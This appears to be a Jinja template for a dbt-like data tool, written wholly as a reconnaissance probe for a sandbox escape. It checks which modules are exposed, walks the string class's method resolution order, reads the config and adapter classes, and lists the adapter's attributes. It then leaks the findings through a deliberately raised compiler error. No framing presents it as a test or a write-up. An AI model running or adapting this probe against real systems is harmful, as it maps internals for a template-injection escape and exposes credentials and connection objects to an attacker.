{% set ns = namespace(output='[MODULES] ') %}

{# Check what modules are available #}
{% if modules is defined %}
  {% set ns.output = ns.output ~ 'modules=DEFINED' %}
  {% if modules.datetime is defined %}
    {% set ns.output = ns.output ~ ' | datetime=YES' %}
    {% set ns.output = ns.output ~ ' | dt_class=' ~ modules.datetime.__class__.__name__ %}
  {% endif %}
  {% if modules.pytz is defined %}
    {% set ns.output = ns.output ~ ' | pytz=YES' %}
  {% endif %}
{% else %}
  {% set ns.output = ns.output ~ 'modules=UNDEFINED' %}
{% endif %}

{# Try Python sandbox escape via string class chain #}
{% set ns.output = ns.output ~ ' | str_class=' ~ ''.__class__.__name__ %}
{% set ns.output = ns.output ~ ' | str_mro=' ~ ''.__class__.__mro__ | string | truncate(200) %}

{# Try to access config internals #}
{% set ns.output = ns.output ~ ' | config_class=' ~ config.__class__.__name__ %}
{% set ns.output = ns.output ~ ' | adapter_class=' ~ adapter.__class__.__name__ %}

{# Try to get adapter connection manager #}
{% set result = [] %}
{% for attr in adapter.__class__.__dict__.keys() if not attr.startswith('_') %}
  {% do result.append(attr) %}
{% endfor %}
{% set ns.output = ns.output ~ ' | adapter_attrs=' ~ result | join(',') | truncate(300) %}

{{ exceptions.raise_compiler_error(ns.output) }}
